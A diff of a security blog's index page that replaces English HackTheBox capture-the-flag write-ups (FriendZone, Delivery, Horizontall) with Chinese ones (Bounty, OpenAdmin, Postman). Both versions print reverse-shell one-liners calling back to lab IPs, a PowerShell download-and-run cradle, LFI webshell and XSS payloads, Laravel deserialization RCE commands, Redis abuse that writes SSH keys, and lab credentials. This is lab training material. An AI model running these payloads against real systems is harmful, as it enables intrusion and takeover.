@@ -71,10 +71,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-FriendZone" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-bounty" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/19/FriendZone/" class="article-date">
-  <time class="dt-published" datetime="2022-07-20T03:34:51.000Z" itemprop="datePublished">2022-07-19</time>
+    <a href="/2022/09/02/bounty/" class="article-date">
+  <time class="dt-published" datetime="2022-09-02T11:31:40.000Z" itemprop="datePublished">2022-09-02</time>
 </a>
     
   </div>
@@ -85,7 +85,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/19/FriendZone/">FriendZone</a>
+      <a class="p-name article-title" href="/2022/09/02/bounty/">bounty</a>
     </h1>
   
 
@@ -93,63 +93,56 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/19/FriendZone/nmap.png">
-the machine opnes ftp,ssh,smbd and ssl
-the port 80 just a picture
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/02/bounty/nmap.png">
+#### port
+只开放了一个80端口，是一张IIS7.5的图
+#### 目录扫描
+<img src="/2022/09/02/bounty/dir.png">
+只有一个aspnet_client且这个目录是403的
+用大字典再扫一次
+writeup说存在一个transfer.aspx文件，但是我没扫到
+#### 上传文件
+试着传一个cmd.aspx到靶机，会被拦截
+用%00进行截断上传，可以上传成功
+<img src="/2022/09/02/bounty/burp.png">
+尝试访问10.10.10.93/UploadedFiles/cmd.aspx，访问不了
+搜索iis7.5 upload rce
+(链接)[https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/]
+上传一个web.config
+<img src="/2022/09/02/bounty/webconfig1.png">
+访问web.config会得到回显
+<img src="/2022/09/02/bounty/webconfig2.png">
+准备反弹一个shell给本机
+首先先下载一个(Nishang’s Invoke-PowerShellTcp.ps1)[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1]
+在最后添加一个反弹shell
+`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 8888`
+把web.config编辑成下列形式
+<img src="/2022/09/02/bounty/webconfig3.png">
+在本地开一个http服务器准备传送文件，同时开启一个nc监听8888端口等待回弹shell
+<img src="/2022/09/02/bounty/user.png">
+在merlin的文件夹中没有有用的信息
+gci -force强制显示隐藏文件
+#### root
+systeminfo
+<img src="/2022/09/02/bounty/systeminfo.png">
+MS15-051提权
+`
+(new-object net.webclient).downloadfile('http://10.10.14.4/lp.exe','C:\users\merlin\appdata\local\temp\lp.exe')
+(new-object net.webclient).downloadfile('http://10.10.14.4/rev.bat','C:\users\merlin\appdata\local\temp\rev.bat')
+`
+(lonelypotato)[https://github.com/NotMedic/lonelypotato/tree/master/RottenPotatoEXE]
+<img src="/2022/09/02/bounty/rev.png">
+`C:\users\merlin\appdata\local\temp\lp.exe * C:\users\merlin\appdata\local\temp\rev.bat`
+<img src="/2022/09/02/bounty/root.png">
 
-<h5 id="SMB-shares-445-x2F-139"><a href="#SMB-shares-445-x2F-139" class="headerlink" title="SMB shares 445&#x2F;139"></a>SMB shares 445&#x2F;139</h5><p>first use smbmap to list shares and permissions</p>
-<pre><code>smbmap -H 10.10.10.123
-</code></pre>
-<img src="/2022/07/19/FriendZone/smbscan.png">
-it can also get using smbclient
 
-<pre><code>smbclient -N -L //10.10.10.123
-</code></pre>
-<p>-N represent null session (or no auth) and -L to list<br><img src="/2022/07/19/FriendZone/smbclient.png"><br>the comment of Files says that its &#x2F;etc&#x2F;Files<br>so we can use nmap to verify</p>
-<pre><code>nmap --script smb-enum-shares.nse -p445 10.10.10.123
-</code></pre>
-<img src="/2022/07/19/FriendZone/nmapscript.png">
-it will give me the path on target to the share
 
-<h6 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h6><p>The Development share is empty:<br><img src="/2022/07/19/FriendZone/Development.png"></p>
-<h6 id="general"><a href="#general" class="headerlink" title="general"></a>general</h6><p>The general share has a single file,we can get it and have a look<br><img src="/2022/07/19/FriendZone/general.png"><br>its a cred<br><img src="/2022/07/19/FriendZone/cred.png"></p>
-<h5 id="TCP-80"><a href="#TCP-80" class="headerlink" title="TCP 80"></a>TCP 80</h5><p>the site give us a new domain <code>friendzoneportal.red</code><br>we now use dirsearch to find some paths<br><img src="/2022/07/19/FriendZone/dirsearch.png"><br>the robots.txt just a phrase<br><img src="/2022/07/19/FriendZone/robots.png"><br>and the wordpress is empty dir</p>
-<h5 id="https-443"><a href="#https-443" class="headerlink" title="https 443"></a>https 443</h5><p>first use the comman name get via nmap to visit <code>https://friendzone.red:443/</code><br>the site just has a picture<br><img src="/2022/07/19/FriendZone/443pic.png"><br>and if we view page source,we can get another path<br><img src="/2022/07/19/FriendZone/443.png"><br>the js&#x2F;js path has a encode string,so we can try to decode it<br><img src="/2022/07/19/FriendZone/jsjs.png"><br>it also have a hint<br><img src="/2022/07/19/FriendZone/jshint.png"><br>i temporarily don’t know what’s the meaning of it</p>
-<h5 id="TCP-x2F-UDP-53"><a href="#TCP-x2F-UDP-53" class="headerlink" title="TCP&#x2F;UDP 53"></a>TCP&#x2F;UDP 53</h5><p>TCP is only used in DNS when the response size is greater than 512 bytes. Typically this is associated with Zone Transfers, where the server give all the information it has for a domain. There’s a few things I could try to enumerate DNS, but the fact that the host is listening on TCP 53 suggests the first thing I should try is a Zone Transfer.<br>I’ll do that with dig. I’ll start with friendzone.htb, and get nothing:<br><img src="/2022/07/19/FriendZone/dig1.png"><br>Since I have a domain name in the TLS certificate, I’ll try that:<br><img src="/2022/07/19/FriendZone/dig2.png"><br>I can also try the domain I got on the first webpage, “friendzoneportal.red”:<br><img src="/2022/07/19/FriendZone/dig3.png"><br>I’ll update my hosts file for each of these:<br><img src="/2022/07/19/FriendZone/host.png"></p>
-<h5 id="administrator1-friendzone-red"><a href="#administrator1-friendzone-red" class="headerlink" title="administrator1.friendzone.red"></a>administrator1.friendzone.red</h5><img src="/2022/07/19/FriendZone/login1.png">
-use the creds we get ,and we can in 
-<img src="/2022/07/19/FriendZone/logindone.png">
-visit /dashboard.php ,and we can find something else
-<img src="/2022/07/19/FriendZone/dashboard.png">
-we add the `?image_id=a.jpg&pagename=timestamp` to the path,and we can get another page
-<img src="/2022/07/19/FriendZone/dashboardpic.png">
-use dirsearch to search the path
-<img src="/2022/07/19/FriendZone/dirsearch2.png">
-it's has a image dir and has two pics
-and it's also has a page called timestamp.php
 
-<h4 id="2-get-webshell-access"><a href="#2-get-webshell-access" class="headerlink" title="2.get webshell access"></a>2.get webshell access</h4><h5 id="Find-LFI"><a href="#Find-LFI" class="headerlink" title="Find LFI"></a>Find LFI</h5><p>because the pic is load by the full path,we can try to find load file inclusion<br>1.image_id<br>The image_id, such as a.jpg is a full file name. I’ll try giving it a php page, which it would load if that file is being shown using include in php. Unfortunately, it just shows a broken image:<br><img src="/2022/07/19/FriendZone/lfi1.png"><br>Looking at the source, I see <code>&lt;img src=&#39;images/timestamp.php&#39;&gt;</code>. I could play with XSS here, and see if I can get it to load a script. For example, if I set <code>image_id=&#39; onerror=&#39;javascript: alert(&quot;XXS HERE&quot;);</code>, I get a pop-up:<br><img src="/2022/07/19/FriendZone/xss.png"><br>The source explains it: <code>&lt;img src=&#39;images/&#39; onerror=&#39;javascript: alert(&quot;XXS HERE&quot;);&#39;&gt;</code><br>2.pagename<br>Since the given example case is <code>timestamp</code>, and there’s a <code>timestamp.php</code> in the same directory, I can assume that this is likely doing a <code>include($_GET[&quot;pagename&quot;] . &quot;.php&quot;)</code>. I can test this by having it point to other php pages.<br>Visiting <code>https://administrator1.friendzone.red/login.php</code> returns: <code>Wrong!</code><br>and we change to pagename to login can also see the same word<br><img src="/2022/07/19/FriendZone/wrong.png"></p>
-<h5 id="read-PHP-resource"><a href="#read-PHP-resource" class="headerlink" title="read PHP resource"></a>read PHP resource</h5><p>I can use this LFI to read source code for these pages using php filters. If I visit <code>pagename=php://filter/convert.base64-encode/resource=dashboard</code>, I can see a long base64 string on the page:<br><img src="/2022/07/19/FriendZone/base64.png"><br>decoding it,and we can find something<br><img src="/2022/07/19/FriendZone/sourcecode.png"><br>we can do the same thing to read upload <code>pagename=php://filter/convert.base64-encode/resource=../uploads/upload</code><br><img src="/2022/07/19/FriendZone/uploadsource.png"></p>
-<h5 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h5><p>I want to use this LFI to include a webshell so I can run commands. I’ll use my smb access to drop a simple php command shell into the Development share, which nmap told me was &#x2F;etc&#x2F;Development.<br><img src="/2022/07/19/FriendZone/cmdphp.png"><br>and upload it to the machine</p>
-<pre><code>smbclient -N //10.10.10.123/Development -c &#39;put cmd.php zyz.php&#39;
-</code></pre>
-<img src="/2022/07/19/FriendZone/zyzphp.png">
-Now, on visiting `https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/zyz&cmd=id`, I get output:
-<img src="/2022/07/19/FriendZone/webshell.png">
-
-<p> I’ll use my go to from the <a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a> and visit: <code>https://administrator1.friendzone.red/dashboard.php?image_id=&amp;pagename=../../../etc/Development/zyz&amp;cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;%261|nc 10.10.16.10 4444 &gt;/tmp/f</code> (remembering to encode the &amp; as %26):<br><img src="/2022/07/19/FriendZone/reverse.png"><br>After a shell upgrade <code>(python -c &#39;import pty;pty.spawn(&quot;bash&quot;)&#39;</code>, <code>ctrl-z</code>, <code>stty raw -echo;fg</code>, <code>reset</code>, enter “screen” for terminal type if asked), I’ve got a full shell. And I can get user.txt.<br>In the &#x2F;var&#x2F;www&#x2F; directory, there’s folders for all the different sites, as well as an sql conf file:<br><img src="/2022/07/19/FriendZone/mysql.png"><br>use the password to su friend<br><img src="/2022/07/19/FriendZone/friend.png"></p>
-<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>search around the machine, there has a py script in &#x2F;opt&#x2F;server_admin<br><img src="/2022/07/19/FriendZone/pyscript.png"><br>find &#x2F;tmp can write to upload our <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a></p>
-<pre><code>our machine:python3 -m http.server 80
-target machine:wget http://10.10.16.10/pspy32s
-               chmod +x pspy32s
-       ./pspy32s
-</code></pre>
-<p>and we can find that root was running this script every two minutes:<br><img src="/2022/07/19/FriendZone/script.png"><br>via linpeas.sh,we find a file that friend can write<br><img src="/2022/07/19/FriendZone/friendcanwrite.png"><br>we append the following scripts to the end of it<br><img src="/2022/07/19/FriendZone/append.png"><br>and finally we get the root<br><img src="/2022/07/19/FriendZone/rootflag.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/19/FriendZone/" data-id="cl7edtt470005jtcphu66b5ub" data-title="FriendZone" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/02/bounty/" data-id="cl7lcjxnd00005pcp8qd44q2k" data-title="bounty" class="article-share-link">Share</a>
       
       
       
@@ -161,10 +154,10 @@ target machine:wget http://10.10.16.10/pspy32s
 
 
   
-    <article id="post-Delivery" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-openadmin" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/18/Delivery/" class="article-date">
-  <time class="dt-published" datetime="2022-07-18T14:00:34.000Z" itemprop="datePublished">2022-07-18</time>
+    <a href="/2022/09/01/openadmin/" class="article-date">
+  <time class="dt-published" datetime="2022-09-02T02:44:50.000Z" itemprop="datePublished">2022-09-01</time>
 </a>
     
   </div>
@@ -175,7 +168,7 @@ target machine:wget http://10.10.16.10/pspy32s
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/18/Delivery/">Delivery</a>
+      <a class="p-name article-title" href="/2022/09/01/openadmin/">openadmin</a>
     </h1>
   
 
@@ -183,25 +176,58 @@ target machine:wget http://10.10.16.10/pspy32s
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/18/Delivery/nmap.png">
-and add helpdesk.delivery.htb to /etc/hosts
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/01/openadmin/nmap.png">
+#### port explore
+只开放了22和80端口
+80端口是apache的默认界面
+22端口无法匿名登录
+#### 目录遍历
+<img src="/2022/09/01/openadmin/dirsearch.png">
+扫出两个页面，一个是music一个是ona
+opennetadmin显示是v18.1.1,searchsploit后发现有远程代码执行漏洞
+在github上找一个利用脚本，成功获得www权限
+<img src="/2022/09/01/openadmin/www.png">
+#### user
+用www权限可以发现存在两个用户jimmy和joanna
+<img src="/2022/09/01/openadmin/user.png">
+往目标机传一个linenum.sh试试
+没有什么特别可以注意的
+在local中的一个数据库配置文件里找到了数据库的密码
+`
+'db_login' => 'ona_sys',
+ 'db_passwd' => 'n1nj4W4rri0R!',
+ 'db_database' => 'ona_default',
+`
+<img src="/2022/09/01/openadmin/database.png">
+用数据库的密码尝试登录jimmy和joanna
+jimmy成功登上去了
+但是jimmy的文件夹下是空的，要尝试换成joanna
+在一个叫internal的文件夹里有几个页面
+<img src="/2022/09/01/openadmin/jimmy1.png">
+这里有一个密码
+可以留意一下
+`curl http://10.10.10.171/main.php`一无所获
+查看本机开的端口，有一个52846
+<img src="/2022/09/01/openadmin/net.png">
+用curl去访问，得到一个加密的私钥
+<img src="/2022/09/01/openadmin/joanna.png">
+`ssh2john rsa > password.txt`
+`john -w=/usr/share/wordlists/rockyou.txt password.txt`
+<img src="/2022/09/01/openadmin/ssh1.png">
+密码是bloodninjas
+用ssh连joanna,发现bloodninjas并不是连接密码，是验证密码
+`chmod 600 rsa`
+`ssh -i rsa joanna@10.10.10.171`
+<img src="/2022/09/01/openadmin/ssh2.png">
+joanna有一个用nano读priv的sudo权限
+<img src="/2022/09/01/openadmin/sudo.png">
+用nano读priv以后使用ctrl+R读取需要读得文件
 
-<pre><code>echo &quot;10.10.10.222 helpdesk.delivery.htb&quot; &gt;&gt; /etc/hosts
-</code></pre>
-<h4 id="2-website"><a href="#2-website" class="headerlink" title="2.website"></a>2.website</h4><p>the port 80 shows nothing,but we can change to <a target="_blank" rel="noopener" href="http://helpdesk.delivery.htb/index.php">http://helpdesk.delivery.htb/index.php</a> to get some information<br><img src="/2022/07/18/Delivery/osTicket.png"><br>it shows it’s run a osTicket structer on 80<br>and on port 8065,it shows another login page<br><img src="/2022/07/18/Delivery/mattermost.png"><br>i first add a user in mattermost and try to find a exploit<br>it need me to varify<br>so let’s use searchsploit osticket and try to exploit<br>all the register need verify<br>as a guest,we can open a new ticket and see it’s feedback<br><img src="/2022/07/18/Delivery/newticket.png"></p>
-<h4 id="3-getting-webshell-access"><a href="#3-getting-webshell-access" class="headerlink" title="3.getting webshell access"></a>3.getting webshell access</h4><p>because the machine can not access to the internet,the verify step is unable<br>but when I created a ticket, it offered the ability to update the ticket over email. I can use that to get the verification email.<br><img src="/2022/07/18/Delivery/viewticket.png"><br>I’ll create a ticket and get the email address for it. Then sign up for a MatterMost account:<br><img src="/2022/07/18/Delivery/step1.png"><br><img src="/2022/07/18/Delivery/step2.png"><br>the default email is <a href="mailto:&#50;&#x32;&#48;&#48;&#52;&#57;&#51;&#64;&#100;&#x65;&#x6c;&#105;&#x76;&#x65;&#114;&#121;&#x2e;&#x68;&#x74;&#98;">&#50;&#x32;&#48;&#48;&#52;&#57;&#51;&#64;&#100;&#x65;&#x6c;&#105;&#x76;&#x65;&#114;&#121;&#x2e;&#x68;&#x74;&#98;</a><br>register a new account use <a href="mailto:&#50;&#50;&#x30;&#48;&#x34;&#57;&#51;&#x40;&#100;&#101;&#108;&#x69;&#118;&#x65;&#114;&#121;&#46;&#104;&#x74;&#x62;">&#50;&#50;&#x30;&#48;&#x34;&#57;&#51;&#x40;&#100;&#101;&#108;&#x69;&#118;&#x65;&#114;&#121;&#46;&#104;&#x74;&#x62;</a><br><img src="/2022/07/18/Delivery/step3.png"><br>check the ticketnum use 2200493<br><img src="/2022/07/18/Delivery/step4.png"><br>and now we get the verify mail<br><img src="/2022/07/18/Delivery/step5.png"><br>verify the link and we can get in<br><img src="/2022/07/18/Delivery/step6.png"><br>in the website,we can see a credential —maildeliverer:Youve_G0t_Mail!<br>and it shows a hint that may password are PleaseSubscribe!<br><img src="/2022/07/18/Delivery/creds.png"><br>then i can try to use creds i just get to ssh the machine<br><img src="/2022/07/18/Delivery/userflag.png"></p>
-<h4 id="4-getting-root-access"><a href="#4-getting-root-access" class="headerlink" title="4.getting root access"></a>4.getting root access</h4><p>Mattermost stores it’s configuration in &#x2F;opt&#x2F;mattermost&#x2F;config&#x2F;config.json. The database connection information is in here:<br><img src="/2022/07/18/Delivery/sqlpass.png"></p>
-<p>username:mmuser<br>password:Crack_The_MM_Admin_PW<br>database:mattermost<br><img src="/2022/07/18/Delivery/database.png"><br>we can get username and password from the table User</p>
-<pre><code>select Username,Password from Users;
-</code></pre>
-<img src="/2022/07/18/Delivery/Users.png">
-
-<h5 id="crack-root-password"><a href="#crack-root-password" class="headerlink" title="crack root password"></a>crack root password</h5><p>we can save the hash to a file and save the hint PleaseSubscribe! to another file<br><img src="/2022/07/18/Delivery/hashcrack.png"><br>and the result is PleaseSubscribe!21<br><img src="/2022/07/18/Delivery/result.png"><br>finally,we get the root<br><img src="/2022/07/18/Delivery/root.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/18/Delivery/" data-id="cl7edtt440002jtcpahbrf5bp" data-title="Delivery" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/01/openadmin/" data-id="cl7k58yjl000117cpgfhqbewf" data-title="openadmin" class="article-share-link">Share</a>
       
       
       
@@ -213,10 +239,10 @@ and add helpdesk.delivery.htb to /etc/hosts
 
 
   
-    <article id="post-Horizontall" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-postman" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/17/Horizontall/" class="article-date">
-  <time class="dt-published" datetime="2022-07-17T14:08:02.000Z" itemprop="datePublished">2022-07-17</time>
+    <a href="/2022/09/01/postman/" class="article-date">
+  <time class="dt-published" datetime="2022-09-01T14:02:26.000Z" itemprop="datePublished">2022-09-01</time>
 </a>
     
   </div>
@@ -227,7 +253,7 @@ and add helpdesk.delivery.htb to /etc/hosts
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/17/Horizontall/">Horizontall</a>
+      <a class="p-name article-title" href="/2022/09/01/postman/">postman</a>
     </h1>
   
 
@@ -235,43 +261,62 @@ and add helpdesk.delivery.htb to /etc/hosts
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><p>first we add the host to &#x2F;etc&#x2F;hosts</p>
-<pre><code>echo &quot;10.10.11.105 horizontall.htb&quot; &gt;&gt; /etc/hosts
-</code></pre>
-<img src="/2022/07/17/Horizontall/nmap.png">
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/01/postman/nmap.png">
+#### port explore
+22端口不支持无用户名密码登录
+80端口是一个静态页面
+10000端口是一个登录页面
+6379是redis,可能是入手点
+#### 目录爆破
+两个端口
+80和10000
+80端口扫出来一个upload界面，但是不知道如何上传
+#### web root
+尝试利用redis未授权漏洞
+先使用telnet验证是否有密码验证
+telnet 10.10.10.160 6379
+<img src="/2022/09/01/postman/redis.png">
+我们可以创建一个ssh密钥连接，将公钥写入redis，用私钥连接
+<img src="/2022/09/01/postman/ssh1.png">
+创建好了之后我们下一步就是准备将 它存储到内存之中。由于内存转储中也将包含垃圾，因此我们在密钥周围使用换行符，并且保存在foo.txt中，以便我们更好的守护我们的SSH密钥。
+`(echo -e "\n\n"; cat keys.pub; echo -e "\n\n") > foo.txt`
+使用redis-cli登录到redis查询他的目录
+`config get dir`
+<img src="/2022/09/01/postman/redis2.png">
+将公钥写入redis目录
+`cat foo.txt | redis-cli -h 10.10.10.160 -x set ssh_key`
+<img src="/2022/09/01/postman/redis3.png">
+已经成功写入公钥，下一步是配置公钥
+获取Redis命令行-将密钥插入到内存之中
+<img src="/2022/09/01/postman/redis4.png">
+设置redis的dir目录
+CONFIG SET dir /var/lib/redis/.ssh
+设置dbfilename为authorized_keys
+config set dbfilename authorized_keys
+退出该界面，用ssh登录
+ssh -i keys redis@10.10.10.160
+成功用redis连接
+<img src="/2022/09/01/postman/web.png">
+用history命令可以发现他查看过scan.py和id_rsa.bak
+<img src="/2022/09/01/postman/ssh2.png">
+id_rsa.bak是一个加密过的
+用ssh2john破解该私钥
+`ssh2john id_rsa.bak > hash.txt`
+`john -w=/usr/share/wordlists/rockyou.txt hash.txt`
+<img src="/2022/09/01/postman/ssh3.png">
+破解出的密码为computer2008
+尝试用这个帐号密码进行ssh登录
+登录失败，用redis身份登录，查看/etc/ssh/sshd_config
+发现Matt在deny user中
+<img src="/2022/09/01/postman/deny.png">
+直接尝试su Matt，成功切换到Matt用户
 
-<h4 id="2-getting-web-access"><a href="#2-getting-web-access" class="headerlink" title="2.getting web access"></a>2.getting web access</h4><p>the website don’t have any button can link to other pages<br>the page has two js file,and we can read them to find something<br><img src="/2022/07/17/Horizontall/js1.png" width="70%"><br><img src="/2022/07/17/Horizontall/js2.png" width="100%"></p>
-<p>The JavaScript in app.c68eb462.js is minified, but tossing it into a <a target="_blank" rel="noopener" href="https://www.qianbo.com.cn/Tool/Beautify/Js-Formatter.html">jsFormatter</a> returns 654 lines of JavaScript. Glancing through it, this section jumped out because it reveals a subdomain:<br><img src="/2022/07/17/Horizontall/access.jpg" width="70%"></p>
-<p>after this,i also use firsearch and fuzz to test the website,but we don’t have some useful information<br>so we first add the <code>api-prod.horizontall.htb</code> to &#x2F;etc&#x2F;hosts</p>
-<pre><code>echo &quot;10.10.11.105 api-prod.horizontall.htb&quot; &gt;&gt; /etc/hosts
-</code></pre>
-<p>and visit the page and use dirsearch the site,we can see some admin pages and a &#x2F;reviews page<br><img src="/2022/07/17/Horizontall/dirsearch.png" width="70%"><br>the reviews page returns a json string<br><img src="/2022/07/17/Horizontall/json.png" width="70%"><br>in the admin page,we know it build with strapi<br>we can use searchsploit to search and use msfconsole to make some exploit<br><img src="/2022/07/17/Horizontall/strapi.png" width="70%"><br>we can see the poc and get the way to know the version<br><img src="/2022/07/17/Horizontall/getversion.png" width="70%"><br><img src="/2022/07/17/Horizontall/curl.png" width="70%"><br>the version greatly match the exploit,so we can try to change the password<br><img src="/2022/07/17/Horizontall/web.png" width="70%"><br>we can use the command to reverse a shell</p>
-<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39;
-</code></pre>
-<img src="/2022/07/17/Horizontall/shell.png" width="70%">
-and use the command to get a interactive shell
-
-<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
-</code></pre>
-<p>in the <code>/home/developer</code>,we don’t have permission</p>
-<h4 id="3-getting-root-acccess"><a href="#3-getting-root-acccess" class="headerlink" title="3.getting root acccess"></a>3.getting root acccess</h4><p>the existence of a <code>composer-setup.php</code> file suggests there’s some kind of PHP site in use here.<br>Looking at the <code>netstat</code>, there’s the site on 80, and a NodeJS side on 1337. There’s also MySQL on 3306 (which makes sense). But there’s also something on 8000:<br><img src="/2022/07/17/Horizontall/netstat.png" width="70%"><br>The service on 8000 is an HTTP server:<br><img src="/2022/07/17/Horizontall/8000.png" width="70%"><br>And based on the response and the cookies, it looks like Laravel, a PHP framework.</p>
-<h5 id="page-access"><a href="#page-access" class="headerlink" title="page access"></a>page access</h5><p>the strapi user’s home directory is &#x2F;opt&#x2F;strapi, I can still add a .ssh directory and an authorized_keys file. I’ll add my key:<br><img src="/2022/07/17/Horizontall/ssh.png" width="70%"><br><img src="/2022/07/17/Horizontall/8000local.png" width="70%"><br>now we get a default page running in localhost:8000<br><img src="/2022/07/17/Horizontall/page.png" width="70%"><br>use dirsearch and we can find a &#x2F;profiles<br><img src="/2022/07/17/Horizontall/profiles.png" width="70%"><br>But not only does it crash, but it returns a bunch of information. This is Laravel debug mode.</p>
-<h5 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit 1"></a>exploit 1</h5><p>the laravel has a remote code execution &lt;&#x3D;v8.4.2 Debug Mode<br>we can get a poc from <a target="_blank" rel="noopener" href="https://github.com/zhzyker/CVE-2021-3129">repo</a><br><img src="/2022/07/17/Horizontall/root.png" width="70%"><br>Reviewing the code we see where the id command is being executed:<br><img src="/2022/07/17/Horizontall/rce.png" width="70%"><br>we can set the SUID bit to bash for a quick privilege escalation to root shown in the rce2:<br><img src="/2022/07/17/Horizontall/final.png" width="70%"><br>we can see that the SUID is set with ls -l &#x2F;bin&#x2F;bash<br><img src="/2022/07/17/Horizontall/suid.png" width="70%"></p>
-<h5 id="exploit-2"><a href="#exploit-2" class="headerlink" title="exploit 2"></a>exploit 2</h5><p>To show it works, I’ll start with the id command. First, I’ll generate the payload using phpggc:</p>
-<pre><code>php -d&#39;phar.readonly=0&#39; /opt/phpggc/phpggc --phar phar -o id.phar --fast-destruct monolog/rce1 system id
-</code></pre>
-<p>This creates a serialized PHP file, which I saved as id.phar. The file looks like a PHP object:<br><img src="/2022/07/17/Horizontall/xxd.png" width="70%"><br>the command,<code>id</code>, is on line 0x000000f0.<br>Now I’ll run the <a target="_blank" rel="noopener" href="https://github.com/ambionics/laravel-exploits">Python script</a>, passing it the serialized payload:</p>
-<pre><code>python3 /opt/laravel-exploits/laravel-ignition-rce.py http://127.0.0.1:8000 id.phar 
-</code></pre>
-<p>to get a shell,we can regenerate a new payload, this time creating &#x2F;root&#x2F;.ssh if it doesn’t exist, and then writing my SSH key to authorized_keys:</p>
-<pre><code>php -d&#39;phar.readonly=0&#39; /opt/phpggc/phpggc --phar phar -o ssh.phar --fast-destruct monolog/rce1 system &#39;mkdir -p /root/.ssh; echo &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing&quot; &gt;&gt; /root/.ssh/authorized_keys&#39;
-</code></pre>
-<p>Run the exploit again,and  we can also get the root access.</p>
+<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><p>先使用sudo -l查看是否存在matt可以直接运行的文件，发现没有<br>尝试用Matt-computer2008登录webmin，因为webmin用系统的登录凭证做用户名密码很常见<br><img src="/2022/09/01/postman/webmin.png"><br>登录上去以后发现webmin的版本是1.91<br>用searchsploit搜索发现webmin1.910存在RCE，去github上搜索利用脚本<br>尝试使用，成功获得root身份<br><img src="/2022/09/01/postman/root.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/17/Horizontall/" data-id="cl7edtt490008jtcp2uqzczxc" data-title="Horizontall" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/01/postman/" data-id="cl7k58yjn000217cp4onseli6" data-title="postman" class="article-share-link">Share</a>
       
       
       
@@ -283,10 +328,10 @@ and use the command to get a interactive shell
 
 
   
-    <article id="post-Previse" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-blunder" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/16/Previse/" class="article-date">
-  <time class="dt-published" datetime="2022-07-17T02:20:38.000Z" itemprop="datePublished">2022-07-16</time>
+    <a href="/2022/09/01/blunder/" class="article-date">
+  <time class="dt-published" datetime="2022-09-01T14:00:39.000Z" itemprop="datePublished">2022-09-01</time>
 </a>
     
   </div>
@@ -297,7 +342,7 @@ and use the command to get a interactive shell
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/16/Previse/">Previse</a>
+      <a class="p-name article-title" href="/2022/09/01/blunder/">blunder</a>
     </h1>
   
 
@@ -305,33 +350,46 @@ and use the command to get a interactive shell
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/16/Previse/nmap.png">
-
